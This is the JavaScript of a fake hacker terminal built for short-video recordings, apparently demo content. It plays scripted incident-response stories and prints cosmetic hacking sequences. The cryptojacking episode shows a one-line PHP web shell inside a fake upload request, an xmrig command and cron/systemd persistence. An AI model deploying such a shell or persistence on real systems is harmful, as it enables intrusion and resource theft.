    addOutput('<div class="info-line mt-2">▸ Analyzing resource consumption...</div>');
    await sleep(1500);

    addOutput('<div class="error-line mt-2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="error-line">AFFECTED INSTANCES: 73 EC2 servers</div>');
    addOutput('<div class="error-line">AVERAGE CPU USAGE: 98%</div>');
    addOutput('<div class="error-line">NETWORK TRAFFIC: 847 GB outbound</div>');
    addOutput('<div class="error-line">COST INCREASE: $12,847 (7 days)</div>');
    addOutput('<div class="error-line">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(3000);

    addOutput('<div class="info-line mt-2">▸ Investigating running processes...</div>');
    await sleep(1500);

    addOutput('<div class="code-block">PID    USER   CPU%  MEM%   COMMAND\n4721   www    99.8  45.2   /tmp/.xmr/xmrig --url pool.███████.to:3333\n4723   www    99.7  44.8   /tmp/.xmr/xmrig --url pool.███████.to:3333\n4729   www    99.9  45.1   /tmp/.xmr/xmrig --url pool.███████.to:3333</div>');
    await sleep(2500);

    addOutput('<div class="error-line mt-2">⚠ Cryptocurrency miner detected: XMRig (Monero)</div>');
    addOutput('<div class="error-line">⚠ Mining pool: pool.███████.to</div>');
    await sleep(2000);

    addOutput('<div class="info-line mt-2">▸ Tracing infection vector...</div>');
    await sleep(1500);

    addOutput('<div class="result-line">Analyzing file creation timestamps...</div>');
    await sleep(1000);
    addOutput('<div class="result-line">First miner deployed: November 25, 2025 03:47 AM</div>');
    addOutput('<div class="result-line">Entry point: Vulnerable web application</div>');
    await sleep(2000);

    addOutput('<div class="info-line mt-2">▸ Examining web application logs...</div>');
    await sleep(1500);

    addOutput('<div class="code-block">POST /api/upload HTTP/1.1\nContent-Type: multipart/form-data\nFilename: profile.jpg.php\n\n<?php system($_GET[\'cmd\']); ?></div>');
    await sleep(2500);

    addOutput('<div class="error-line mt-2">⚠ Unrestricted file upload vulnerability exploited</div>');
    addOutput('<div class="error-line">⚠ Web shell deployed: /uploads/profile.jpg.php</div>');
    await sleep(2000);

    addOutput('<div class="info-line mt-2">▸ Analyzing miner configuration...</div>');
    await sleep(1500);

    addOutput('<div class="result-line">Mining Wallet: 4█████████████████████████████████████████████████████</div>');
    addOutput('<div class="result-line">Estimated Mining Revenue: $2,847 (7 days)</div>');
    addOutput('<div class="result-line">Your Cost: $12,847 in cloud charges</div>');
    await sleep(2500);

    addOutput('<div class="warning-line mt-2">Persistence Mechanisms Identified:</div>');
    const persistence = [
        'Cron job: @reboot /tmp/.xmr/start.sh',
        'Systemd service: /etc/systemd/system/system-update.service',
        'Modified .bashrc to restart miner on login',
        'Watchdog script monitoring miner uptime'
    ];

    for (let mech of persistence) {
        await sleep(800);
        addOutput(`<div class="error-line">⚠ ${mech}</div>`);
    }
    await sleep(2000);

    addOutput('<div class="error-line mt-2 text-glow-red font-bold">━━━ CRYPTOJACKING CONFIRMED ━━━</div>');
    addOutput('<div class="error-line">Malware: XMRig Cryptominer</div>');
    addOutput('<div class="error-line">Cryptocurrency: Monero (XMR)</div>');
    addOutput('<div class="error-line">Financial Impact: $12,847 and growing</div>');
    await sleep(2500);

    addOutput('<div class="warning-line mt-2 font-bold">INITIATING REMEDIATION:</div>');
    await sleep(1000);

    const remediation = [
        'Terminating all mining processes...',
        'Removing cryptominer binaries...',
        'Cleaning persistence mechanisms...',
        'Patching file upload vulnerability...',
        'Removing web shell backdoor...',
        'Rotating all server credentials...',
        'Deploying EDR to all instances...',
        'Implementing resource usage alerts...'
    ];

    for (let action of remediation) {
        await sleep(900);
        addOutput(`<div class="success-line">✓ ${action}</div>`);
    }
    await sleep(1500);

    addOutput('<div class="info-line mt-2">▸ Scanning entire infrastructure...</div>');
    await sleep(1500);

    const progressDiv = addOutput('<div class="progress-bar"><div class="progress-fill" id="module8-progress" style="width: 0%"></div></div>');
    for (let i = 0; i <= 100; i += 20) {
        await sleep(400);
        document.getElementById('module8-progress').style.width = i + '%';
    }
    await sleep(800);

    addOutput('<div class="success-line mt-2">✓ All 73 instances cleaned successfully</div>');
    addOutput('<div class="success-line">✓ CPU utilization returned to normal (12% avg)</div>');
    addOutput('<div class="success-line">✓ Vulnerability patched across all systems</div>');
    await sleep(2000);

    addOutput('<div class="success-line mt-2 text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">CRYPTOMINERS ELIMINATED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INFRASTRUCTURE SECURED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INCIDENT 8 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1000);

    addOutput('<div class="info-line mt-2 text-center">Type <span style="color: #00d4ff;">start incident 9</span> for the next episode...</div>');
}

// INCIDENT 9: API Security Breach
async function executeModule9() {
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 9: API SECURITY BREACH      ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  Episode 9: The Token Leak          ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);

    addOutput('<div class="result-line">Date: December 7, 2025 - 11:43 PM</div>');
    addOutput('<div class="warning-line">⚠ ALERT: Abnormal API request patterns detected</div>');
    await sleep(2000);

    addOutput('<div class="result-line mt-2">API rate limiting triggered on multiple endpoints...</div>');
    addOutput('<div class="result-line">Automated data exfiltration suspected...</div>');
    await sleep(2500);

    addOutput('<div class="info-line mt-2">▸ Analyzing API access logs...</div>');
    await sleep(1500);

    addOutput('<div class="error-line mt-2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="error-line">SUSPICIOUS REQUESTS: 847,293 in 6 hours</div>');
    addOutput('<div class="error-line">API ENDPOINTS HIT: /api/users, /api/customers</div>');
    addOutput('<div class="error-line">DATA ACCESSED: 2.4M customer records</div>');
    addOutput('<div class="error-line">SOURCE IP: 185.XXX.XXX.XXX (TOR exit node)</div>');
    addOutput('<div class="error-line">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(3000);

    addOutput('<div class="info-line mt-2">▸ Identifying authentication method...</div>');
    await sleep(1500);

    addOutput('<div class="code-block">GET /api/v2/customers?page=1&limit=1000 HTTP/1.1\nHost: api.company.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nUser-Agent: python-requests/2.28.1</div>');
    await sleep(2500);

    addOutput('<div class="error-line mt-2">⚠ Valid OAuth token being used</div>');
    addOutput('<div class="error-line">⚠ Token scope: full_access (excessive privileges)</div>');
    await sleep(2000);

    addOutput('<div class="info-line mt-2">▸ Decoding JWT token...</div>');
    await sleep(1500);

    addOutput('<div class="code-block">{\n  "sub": "api_integration_prod",\n  "iat": 1701043200,\n  "exp": 1732579200,  // Expires: 2025-12-31\n  "scope": "full_access",\n  "client_id": "mobile_app_v2"\n}</div>');
    await sleep(2500);

    addOutput('<div class="warning-line mt-2">Token Analysis:</div>');
    addOutput('<div class="error-line">⚠ Token age: 247 days (never rotated)</div>');
    addOutput('<div class="error-line">⚠ Scope too broad: full_access instead of read_only</div>');
    addOutput('<div class="error-line">⚠ No IP restrictions enforced</div>');
    await sleep(2000);

    addOutput('<div class="info-line mt-2">▸ Investigating token leak source...</div>');
    await sleep(1500);

    addOutput('<div class="result-line">Scanning public code repositories...</div>');
    await sleep(1000);
    addOutput('<div class="error-line">✗ Token found in Git██b repository!</div>');
    await sleep(1000);

    addOutput('<div class="code-block">Repository: company/mobile-app-v2 (PUBLIC)\nFile: config/production.env\nCommit: a7f3d9b - "quick fix for prod deploy" - 8 months ago\n\nAPI_TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\nAPI_ENDPOINT=https://api.company.com/v2</div>');
    await sleep(3000);

    addOutput('<div class="error-line mt-2">⚠ Production API token exposed in public repository</div>');
    addOutput('<div class="error-line">⚠ Exposure duration: 8 months</div>');
    addOutput('<div class="error-line">⚠ Repository stars: 47 (high visibility)</div>');
    await sleep(2500);

    addOutput('<div class="error-line mt-2 text-glow-red font-bold">━━━ API SECURITY BREACH ━━━</div>');
    addOutput('<div class="error-line">Root Cause: Hardcoded token in public repo</div>');
    addOutput('<div class="error-line">Data Exposed: 2.4M customer records</div>');
    addOutput('<div class="error-line">Exposure Window: 8 months</div>');
    await sleep(2500);

    addOutput('<div class="info-line mt-2">▸ Assessing compromised data...</div>');
    await sleep(1500);

    const dataTypes = [
        'Customer PII: names, emails, phone numbers',
        'Account details: usernames, account IDs',
        'Purchase history: transactions, amounts',
        'Demographic data: location, preferences'
    ];

    for (let data of dataTypes) {
        await sleep(800);
        addOutput(`<div class="warning-line">⚠ ${data}</div>`);
    }
    await sleep(2000);

    addOutput('<div class="warning-line mt-2 font-bold">EMERGENCY RESPONSE:</div>');
    await sleep(1000);

    const response = [
        'Revoking compromised OAuth token immediately...',
        'Blocking attacker IP at WAF...',
        'Removing token from Git history (BFG Repo-Cleaner)...',
        'Forcing repository to private...',
        'Rotating all API keys and secrets...',
        'Implementing token rotation policy (30 days)...',
        'Adding secret scanning to CI/CD pipeline...',
        'Enabling API rate limiting (1000 req/hour)...',
        'Restricting token scopes (principle of least privilege)...'
    ];

    for (let action of response) {
        await sleep(900);
        addOutput(`<div class="success-line">✓ ${action}</div>`);
    }
    await sleep(1500);

    addOutput('<div class="info-line mt-2">▸ Regulatory compliance check...</div>');
    await sleep(1500);
    addOutput('<div class="warning-line">GDPR breach notification required (72 hours)</div>');
    addOutput('<div class="warning-line">CCPA compliance review initiated</div>');
    await sleep(1500);

    addOutput('<div class="success-line mt-2">✓ Breach contained - API access revoked</div>');
    addOutput('<div class="success-line">✓ Data exfiltration stopped</div>');
    addOutput('<div class="success-line">✓ Security controls enhanced</div>');
    addOutput('<div class="success-line">✓ Incident response complete</div>');
    await sleep(2000);

    addOutput('<div class="success-line mt-2 text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">BREACH CONTAINED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">API SECURED</div>');
    addOutput('<div class="success-line text-glow-green font-bold text-center">INCIDENT 9 COMPLETE</div>');
    addOutput('<div class="success-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1500);

    addOutput('<div class="info-line mt-2 text-center text-glow-blue font-bold">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-center text-glow-blue font-bold">║  ALL 9 INCIDENTS COMPLETE!             ║</div>');
    addOutput('<div class="info-line text-center text-glow-blue font-bold">║  Congratulations, Elite Analyst! 🎉  ║</div>');
    addOutput('<div class="info-line mt-2 text-center text-glow-blue font-bold">╚═══════════════════════════════════════╝</div>');
}

// Command System
const commands = {
    help: {
        description: 'Display all available commands',
        execute: () => {
            return `
<div class="info-line mb-2">Available Commands</div>
<div class="command-table">
    <span class="command-name">help</span><span class="command-desc">Show this help message</span>
    <span class="command-name">about</span><span class="command-desc">System information</span>
    <span class="command-name">clear</span><span class="command-desc">Clear terminal screen</span>
    <span class="command-name">date</span><span class="command-desc">Display current date and time</span>
    <span class="command-name">whoami</span><span class="command-desc">Display current user</span>
    
    <span class="command-name" style="color: #a855f7;">start incident [1-9]</span><span class="command-desc">Launch incident response demo</span>
    <span class="command-name" style="color: #00ff88;">start incident [1-9] interactive</span><span class="command-desc">Interactive mode - YOUR choices matter!</span>
    <span class="command-name" style="color: #00ff88;">playall</span><span class="command-desc">Run all 9 incidents in sequence</span>

    <span class="command-name" style="color: #00d4ff;">hack</span><span class="command-desc">Simulated hacking sequence</span>
    <span class="command-name" style="color: #00d4ff;">scan</span><span class="command-desc">Network port scanner</span>
    <span class="command-name" style="color: #00d4ff;">exploit</span><span class="command-desc">Exploit framework demo</span>
    <span class="command-name" style="color: #00d4ff;">decrypt</span><span class="command-desc">Password decryption</span>
    <span class="command-name" style="color: #00d4ff;">breach</span><span class="command-desc">Data breach simulation</span>
    <span class="command-name" style="color: #00d4ff;">trace</span><span class="command-desc">IP address tracer</span>
    <span class="command-name" style="color: #00d4ff;">malware</span><span class="command-desc">Malware analysis</span>
    
    <span class="command-name">matrix</span><span class="command-desc">Matrix rain effect</span>
    <span class="command-name">tree</span><span class="command-desc">Directory tree view</span>
    <span class="command-name">sysinfo</span><span class="command-desc">System diagnostics</span>
    <span class="command-name">echo [text]</span><span class="command-desc">Echo text back</span>
</div>
`;
        }
    },
    
    about: {
        description: 'System information',
        execute: () => {
            return `
<div class="info-line">SecOps Terminal v2.0</div>
<div class="result-line mt-2">
╔═══════════════════════════════════════════╗
║  Optimized for 9:16 Vertical Recording    ║
║  Perfect for TikTok & YouTube Shorts      ║
╚═══════════════════════════════════════════╝

<span style="color: #9ca3af;">Built for cybersecurity demonstrations,
coding challenges, and technical content.</span>

<span style="color: #00ff88;">Resolution:</span> 607x1080 (9:16)
<span style="color: #00d4ff;">Framework:</span> Tailwind CSS + Vanilla JS
<span style="color: #a855f7;">Status:</span> LIVE & ENCRYPTED
</div>`;
        }
    },
    
    clear: {
        description: 'Clear terminal',
        execute: () => {
            terminalOutput.innerHTML = '';
            return null;
        }
    },
    
    date: {
        description: 'Show date and time',
        execute: () => {
            const now = new Date();
            return `<div class="success-line">${now.toString()}</div>`;
        }
    },
    
    whoami: {
        description: 'Display current user',
        execute: () => {
            return `<div class="success-line">root@secops-terminal</div>`;
        }
    },
    
    echo: {
        description: 'Echo text',
        execute: (args) => {
            return `<div class="result-line">${args.join(' ') || ''}</div>`;
        }
    },
    
    start: {
        description: 'Start module',
        execute: async (args) => {
            // Handle "start incident 1" format
            if (args.length < 2) {
                return `<div class="error-line">Usage: start incident [number] [mode]</div>
<div class="result-line">Available incidents: 1-9</div>
<div class="info-line mt-1">Example: start incident 1</div>
<div class="info-line">Interactive mode: start incident 1 interactive</div>`;
            }

            const keyword = args[0].toLowerCase();
            const moduleNum = args[1];
            const mode = args[2] ? args[2].toLowerCase() : 'demo';

            if (keyword !== 'incident' && keyword !== 'module') {
                return `<div class="error-line">Usage: start incident [number] [mode]</div>
<div class="result-line">Available incidents: 1-9</div>`;
            }

            if (moduleNum === '1') {
                if (mode === 'interactive' || mode === 'i') {
                    await executeModule1Interactive();
                } else {
                    await executeModule1();
                }
                return null;
            } else if (moduleNum === '2') {
                await executeModule2();
                return null;
            } else if (moduleNum === '3') {
                await executeModule3();
                return null;
            } else if (moduleNum === '4') {
                await executeModule4();
                return null;
            } else if (moduleNum === '5') {
                await executeModule5();
                return null;
            } else if (moduleNum === '6') {
                await executeModule6();
                return null;
            } else if (moduleNum === '7') {
                await executeModule7();
                return null;
            } else if (moduleNum === '8') {
                await executeModule8();
                return null;
            } else if (moduleNum === '9') {
                await executeModule9();
                return null;
            } else {
                return `<div class="error-line">Module ${moduleNum} not found</div>
<div class="result-line">Available modules: 1-9</div>`;
            }
        }
    },
    
    hack: {
        description: 'Hacking simulation',
        execute: async () => {
            const stages = [
                { text: 'Initializing attack vector...', color: 'info-line' },
                { text: 'Target acquired: 192.168.1.1', color: 'result-line' },
                { text: 'Bypassing firewall...', color: 'warning-line' },
                { text: 'Firewall bypassed ✓', color: 'success-line' },
                { text: 'Accessing secure database...', color: 'info-line' },
                { text: 'Extracting credentials...', color: 'warning-line' },
                { text: 'admin:5f4dcc3b5aa765d61d8327deb882cf99', color: 'result-line' },
                { text: 'Covering tracks...', color: 'info-line' },
                { text: 'ACCESS GRANTED', color: 'success-line text-glow-green font-bold' }
            ];
            
            addOutput('<div class="hack-text font-bold">[HACK SEQUENCE INITIATED]</div>');
            
            for (let stage of stages) {
                await sleep(700);
                addOutput(`<div class="${stage.color}">${stage.text}</div>`);
            }
            return null;
        }
    },
    
    scan: {
        description: 'Port scanner',
        execute: async () => {
            const ports = [
                { port: 21, service: 'FTP', state: 'closed' },
                { port: 22, service: 'SSH', state: 'open' },
                { port: 23, service: 'Telnet', state: 'filtered' },
                { port: 25, service: 'SMTP', state: 'closed' },
                { port: 80, service: 'HTTP', state: 'open' },
                { port: 443, service: 'HTTPS', state: 'open' },
                { port: 3306, service: 'MySQL', state: 'open' },
                { port: 3389, service: 'RDP', state: 'closed' },
                { port: 8080, service: 'HTTP-ALT', state: 'open' }
            ];
            
            addOutput('<div class="info-line">Starting Nmap 7.94 scan...</div>');
            addOutput('<div class="result-line">Target: 192.168.1.100</div>');
            await sleep(500);
            
            for (let item of ports) {
                const stateClass = item.state === 'open' ? 'success-line' : 
                                   item.state === 'filtered' ? 'warning-line' : 'result-line';
                const icon = item.state === 'open' ? '✓' : 
                            item.state === 'filtered' ? '⚠' : '✗';
                const output = `<div class="${stateClass}">Port ${item.port}/${item.service.padEnd(10)} - ${item.state.toUpperCase()} ${icon}</div>`;
                addOutput(output);
                await sleep(250);
            }
            
            await sleep(300);
            addOutput('<div class="success-line">Scan complete! 5 ports open</div>');
            return null;
        }
    },
    
    exploit: {
        description: 'Exploit framework',
        execute: async () => {
            const steps = [
                'Loading Metasploit Framework...',
                'Analyzing target system...',
                'Vulnerability detected: CVE-2024-8392',
                'Severity: CRITICAL (CVSS 9.8)',
                'Crafting payload...',
                'Payload: windows/x64/meterpreter/reverse_tcp',
                'Sending exploit...',
                'Establishing reverse shell...',
                'Meterpreter session 1 opened',
                'Privilege escalation successful...',
                'ROOT ACCESS OBTAINED'
            ];
            
            addOutput('<div class="warning-line font-bold">[!] EXPLOIT FRAMEWORK LOADED</div>');
            
            for (let i = 0; i < steps.length; i++) {
                await sleep(600);
                const isLast = i === steps.length - 1;
                const className = isLast ? 'success-line text-glow-green font-bold' : 'result-line';
                addOutput(`<div class="${className}">${isLast ? '✓ ' : '▸ '}${steps[i]}</div>`);
            }
            return null;
        }
    },
    
    decrypt: {
        description: 'Decrypt passwords',
        execute: async () => {
            addOutput('<div class="info-line">Initializing decryption module...</div>');
            await sleep(400);
            
            const hash = '5f4dcc3b5aa765d61d8327deb882cf99';
            addOutput(`<div class="result-line">Hash (MD5): ${hash}</div>`);
            await sleep(300);
            
            addOutput('<div class="result-line">Attempting dictionary attack...</div>');
            
            // Progress bar
            const progressDiv = addOutput('<div class="progress-bar"><div class="progress-fill" id="decrypt-progress" style="width: 0%"></div></div>');
            
            const attempts = ['admin123', 'letmein', 'qwerty', 'dragon', 'password'];
            for (let i = 0; i < attempts.length; i++) {
                await sleep(400);
                const progress = ((i + 1) / attempts.length) * 100;
                document.getElementById('decrypt-progress').style.width = progress + '%';
                addOutput(`<div class="result-line">Trying: ${attempts[i]}</div>`);
            }
            
            await sleep(500);
            addOutput('<div class="success-line text-glow-green font-bold">✓ DECRYPTED: password</div>');
            return null;
        }
    },
    
    breach: {
        description: 'Data breach simulation',
        execute: async () => {
            addOutput('<div class="error-line text-glow-red font-bold">[!] SECURITY BREACH DETECTED</div>');
            await sleep(700);
            
            const data = [
                { text: 'Accessing database server...', type: 'warning' },
                { text: 'Connection established', type: 'success' },
                { text: 'Extracting user database...', type: 'warning' },
                { text: 'Records found: 1,247,391', type: 'info' },
                { text: 'Extracting emails...', type: 'warning' },
                { text: 'Extracting password hashes...', type: 'warning' },
                { text: 'Extracting credit card data...', type: 'warning' },
                { text: 'Compressing data...', type: 'info' },
                { text: 'Uploading to secure server...', type: 'warning' },
                { text: 'Data exfiltration complete', type: 'success' }
            ];
            
            for (let item of data) {
                await sleep(550);
                const className = item.type === 'success' ? 'success-line' :
                                 item.type === 'warning' ? 'warning-line' :
                                 item.type === 'info' ? 'info-line' : 'result-line';
                addOutput(`<div class="${className}">▸ ${item.text}</div>`);
            }
            return null;
        }
    },
    
    trace: {
        description: 'IP tracer',
        execute: async () => {
            const ip = '185.220.101.42';
            addOutput(`<div class="info-line">Tracing IP: ${ip}</div>`);
            await sleep(500);
            
            const hops = [
                '192.168.1.1 (Gateway) - 1ms',
                '10.0.0.1 (ISP Router) - 8ms',
                '172.16.0.1 (Regional Hub) - 24ms',
                '203.0.113.1 (Backbone) - 45ms',
                '198.51.100.1 (International) - 89ms',
                '185.220.101.42 (Target) - 142ms'
            ];
            
            for (let hop of hops) {
                await sleep(600);
                addOutput(`<div class="result-line">${hop}</div>`);
            }
            
            await sleep(400);
            addOutput(`
<div class="success-line mt-2">Trace complete!</div>
<div class="result-line">
Location: Moscow, Russia
ISP: Tor Exit Node
Latency: 142ms
</div>`);
            return null;
        }
    },
    
    malware: {
        description: 'Malware analysis',
        execute: async () => {
            addOutput('<div class="info-line">Analyzing suspicious file...</div>');
            await sleep(500);
            
            const analysis = [
                'File: invoice.pdf.exe',
                'Size: 2.4 MB',
                'SHA256: a3f8b9c2d1e4f5...',
                '',
                'Scanning with VirusTotal...',
                'Detections: 47/72',
                '',
                'THREAT IDENTIFIED:',
                '⚠ Trojan.GenericKD.68849391',
                '⚠ Behavior: Keylogger, Data Exfil',
                '⚠ Network: C2 server 185.220.101.42',
                '',
                'QUARANTINED'
            ];
            
            for (let line of analysis) {
                await sleep(400);
                if (line.includes('⚠')) {
                    addOutput(`<div class="error-line">${line}</div>`);
                } else if (line.includes('QUARANTINED')) {
                    addOutput(`<div class="success-line font-bold">${line}</div>`);
                } else if (line === '') {
                    addOutput('<div style="height: 8px;"></div>');
                } else {
                    addOutput(`<div class="result-line">${line}</div>`);
                }
            }
            return null;
        }
    },
    
    matrix: {
        description: 'Matrix effect',
        execute: () => {
            const chars = '01';
            let matrix = '';
            for (let i = 0; i < 20; i++) {
                let line = '';
                for (let j = 0; j < 40; j++) {
                    line += chars[Math.floor(Math.random() * chars.length)];
                }
                matrix += line + '\n';
            }
            return `<div class="success-line"><pre class="ascii-art">${matrix}</pre></div>`;
        }
    },
    
    tree: {
        description: 'Directory tree',
        execute: () => {
            return `<div class="result-line"><pre style="font-size: 12px;">
<span style="color: #00d4ff;">secops/</span>
├── <span style="color: #a855f7;">tools/</span>
│   ├── nmap/
│   ├── metasploit/
│   └── wireshark/
├── <span style="color: #a855f7;">logs/</span>
│   ├── access.log
│   ├── security.log
│   └── audit.log
├── <span style="color: #a855f7;">reports/</span>
│   ├── vulnerability_scan.pdf
│   └── incident_response.docx
└── <span style="color: #a855f7;">scripts/</span>
    ├── auto_scan.py
    └── threat_intel.py
</pre></div>`;
        }
    },
    
    sysinfo: {
        description: 'System info',
        execute: () => {
            return `<div class="result-line">
<span style="color: #00ff88;">System Information</span>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OS:       Kali Linux 2024.3
Kernel:   6.5.0-kali3-amd64
CPU:      Intel i7-13700K @ 5.4GHz
Cores:    16 (8P + 8E)
Memory:   32GB DDR5-6000
Storage:  2TB NVMe Gen4
GPU:      NVIDIA RTX 4070 Ti
Network:  10Gbps Ethernet
Uptime:   42 days, 13:37:00
Security: SELinux Enforcing
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
</div>`;
        }
    },

    demo: {
        description: 'Visual effects demo',
        execute: async () => {
            addOutput('<div class="info-line font-bold">🎬 TACTILE EFFECTS DEMONSTRATION</div>');
            await sleep(800);

            addOutput('<div class="info-line mt-2">Watch for these engaging effects:</div>');
            await sleep(500);

            // Typewriter effect demo
            addOutput('<div class="success-line mt-2">✓ Typewriter command input</div>');
            await sleep(800);

            // Glowing input demo
            addOutput('<div class="success-line">✓ Glowing input on keypress</div>');
            await sleep(800);

            // Screen shake demo
            addOutput('<div class="warning-line mt-2">⚡ Preparing screen shake...</div>');
            await sleep(1000);

            document.querySelector('.terminal-frame').classList.add('screen-shake');
            setTimeout(() => document.querySelector('.terminal-frame').classList.remove('screen-shake'), 500);

            addOutput('<div class="error-line text-glow-red font-bold critical-alert">🔴 CRITICAL ALERT (with screen shake!)</div>');
            await sleep(1500);

            // Code block glow
            addOutput('<div class="info-line mt-2">✨ Hover over code blocks to see glow effect</div>');
            await sleep(500);

            addOutput('<div class="code-block scan-effect">// This code block has a scan effect\nconst hackLevel = "OVER 9000";\nconsole.log("Try running modules for full experience!");</div>');
            await sleep(1500);

            addOutput('<div class="success-line mt-2 text-glow-green font-bold">✓ Demo complete! Try: start incident 1</div>');

            return null;
        }
    },

    playall: {
        description: 'Run all 9 modules in sequence',
        execute: async () => {
            // Initial boot sequence
            await bootSequence();
            await sleep(1000);

            // Module 1
            await moduleTransition(1, 'APT Group Intrusion Detection');
            await executeModule1();
            await sleep(1000);

            // Module 2
            await moduleTransition(2, 'Ransomware Outbreak Response');
            await executeModule2();
            await sleep(1000);

            // Module 3
            await moduleTransition(3, 'SQL Injection Attack');
            await executeModule3();
            await sleep(1000);

            // Module 4
            await moduleTransition(4, 'DDoS Mitigation');
            await executeModule4();
            await sleep(1000);

            // Module 5
            await moduleTransition(5, 'Insider Threat Investigation');
            await executeModule5();
            await sleep(1000);

            // Module 6
            await moduleTransition(6, 'Zero-Day Vulnerability');
            await executeModule6();
            await sleep(1000);

            // Module 7
            await moduleTransition(7, 'Social Engineering Attack');
            await executeModule7();
            await sleep(1000);

            // Module 8
            await moduleTransition(8, 'Cryptojacking Detection');
            await executeModule8();
            await sleep(1000);

            // Module 9
            await moduleTransition(9, 'API Security Breach');
            await executeModule9();
            await sleep(1500);

            // Grand finale with visual effects
            addOutput('<div class="info-line text-glow-green font-bold mt-4">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
            addOutput('<div class="info-line text-glow-green font-bold text-center" style="font-size: 16px;">FINAL ANALYSIS</div>');
            addOutput('<div class="info-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
            await sleep(500);

            addOutput('<div class="result-line mt-2">Compiling results...</div>');
            await sleep(400);

            // Epic finale - Screen shake
            document.querySelector('.terminal-frame').classList.add('screen-shake');
            setTimeout(() => document.querySelector('.terminal-frame').classList.remove('screen-shake'), 500);
            await sleep(600);

            // Victory ASCII Art
            addOutput('<div class="ascii-art text-glow-green" style="font-size: 8px; line-height: 1.1; margin: 16px 0;"><pre>' +
            '  ███╗   ███╗██╗███████╗███████╗██╗ ██████╗ ███╗   ██╗\n' +
            '  ████╗ ████║██║██╔════╝██╔════╝██║██╔═══██╗████╗  ██║\n' +
            '  ██╔████╔██║██║███████╗███████╗██║██║   ██║██╔██╗ ██║\n' +
            '  ██║╚██╔╝██║██║╚════██║╚════██║██║██║   ██║██║╚██╗██║\n' +
            '  ██║ ╚═╝ ██║██║███████║███████║██║╚██████╔╝██║ ╚████║\n' +
            '  ╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝\n' +
            '\n' +
            '   ██████╗ ██████╗ ███╗   ███╗██████╗ ██╗     ███████╗████████╗███████╗\n' +
            '  ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██║     ██╔════╝╚══██╔══╝██╔════╝\n' +
            '  ██║     ██║   ██║██╔████╔██║██████╔╝██║     █████╗     ██║   █████╗\n' +
            '  ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══╝     ██║   ██╔══╝\n' +
            '  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ███████╗███████╗   ██║   ███████╗\n' +
            '   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝   ╚═╝   ╚══════╝\n' +
            '</pre></div>');
            await sleep(800);

            addOutput('<div class="success-line text-center text-glow-green font-bold" style="font-size: 16px;">🎉 ALL 9 INCIDENTS RESOLVED 🎉</div>');
            addOutput('<div class="info-line text-center" style="color: #00d4ff; font-size: 13px; margin-top: 8px;">Elite Incident Responder Status: ACHIEVED</div>');
            await sleep(500);

            addOutput('<div class="info-line text-center mt-2" style="color: #00ff88; font-size: 14px;">🏆 Achievement Unlocked: Master Defender 🏆</div>');
            addOutput('<div class="info-line text-glow-green font-bold mt-2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');

            return null;
        }
    }
};

// Command Execution
async function executeCommand(input) {
    if (isProcessing) return;
    
    const parts = input.trim().split(' ');
    const command = parts[0].toLowerCase();
    const args = parts.slice(1);
    
    // Add to history
    if (input.trim()) {
        commandHistory.push(input);
        historyIndex = commandHistory.length;
    }
    
    // Display command
    addCommandLine(input);
    
    // Execute
    if (commands[command]) {
        isProcessing = true;
        const result = await commands[command].execute(args);
        if (result) {
            addOutput(result);
        }
        isProcessing = false;
    } else if (input.trim()) {
        addOutput(`<div class="error-line">Command not found: ${command}</div>`);
        addOutput(`<div class="result-line">Type <span style="color: #00d4ff;">help</span> for available commands</div>`);
    }
}

// Add tactile feedback to input
terminalInput.addEventListener('input', (e) => {
    // Add glow effect on typing
    const inputContainer = terminalInput.parentElement.parentElement;
    inputContainer.classList.add('input-active');
    setTimeout(() => inputContainer.classList.remove('input-active'), 300);
});

// Keystroke sound effect (visual feedback)
terminalInput.addEventListener('keypress', (e) => {
    // Add subtle shake effect
    terminalInput.classList.add('keystroke-effect');
    setTimeout(() => terminalInput.classList.remove('keystroke-effect'), 100);
});

// Input Handling
terminalInput.addEventListener('keydown', async (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        const input = terminalInput.value;
        terminalInput.value = '';

        if (input.trim()) {
            // If waiting for user input in interactive mode
            if (awaitingUserInput) {
                // Show user's response
                await typewriterCommand(input, 30);
                await sleep(200);
                submitUserInput(input);
            } else {
                // Normal command execution
